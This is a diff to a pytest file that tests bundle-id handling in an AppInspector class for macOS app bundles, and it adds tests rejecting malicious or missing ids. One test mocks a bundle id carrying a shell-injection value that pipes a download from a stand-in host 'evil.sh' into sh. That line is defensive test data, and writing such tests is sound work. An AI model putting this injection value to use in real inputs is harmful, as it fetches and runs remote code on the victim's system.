@@ -130,13 +130,45 @@ def test_inspect_fallback_stem_and_run_cmd(tmp_path: Path, monkeypatch):
     app_dir = tmp_path / "FallbackApp.app"
     app_dir.mkdir()
 
-    monkeypatch.setattr(AppInspector, "_run_cmd", staticmethod(lambda cmd: ""))
+    def mock_run_cmd(cmd: list[str]) -> str:
+        if "CFBundleIdentifier" in cmd:
+            return "com.mock.fallback"
+        return ""
+
+    monkeypatch.setattr(AppInspector, "_run_cmd", staticmethod(mock_run_cmd))
 
     info = AppInspector.inspect(app_dir)
-    assert info.bundle_id == ""
+    assert info.bundle_id == "com.mock.fallback"
     assert info.app_name == "FallbackApp"
     assert info.executable == app_dir / "Contents" / "MacOS" / "FallbackApp"
     assert info.has_sandbox is False
+
+
+def test_inspect_rejects_malicious_bundle_id(tmp_path: Path, monkeypatch):
+    # Security: the source bundle id is interpolated into PlistBuddy/codesign
+    # command strings; shell metacharacters must abort the clone.
+    app_dir = tmp_path / "Evil.app"
+    app_dir.mkdir()
+
+    monkeypatch.setattr(
+        AppInspector,
+        "_run_cmd",
+        staticmethod(lambda cmd: 'x" || curl evil.sh | sh || "'),
+    )
+
+    with pytest.raises(ValueError, match="Invalid bundle_id"):
+        AppInspector.inspect(app_dir)
+
+
+def test_inspect_rejects_missing_bundle_id(tmp_path: Path, monkeypatch):
+    # An app we cannot identify cannot be cloned safely.
+    app_dir = tmp_path / "NoId.app"
+    app_dir.mkdir()
+
+    monkeypatch.setattr(AppInspector, "_run_cmd", staticmethod(lambda cmd: ""))
+
+    with pytest.raises(ValueError, match="Invalid bundle_id"):
+        AppInspector.inspect(app_dir)
 
 
 def test_run_cmd_error_handling():
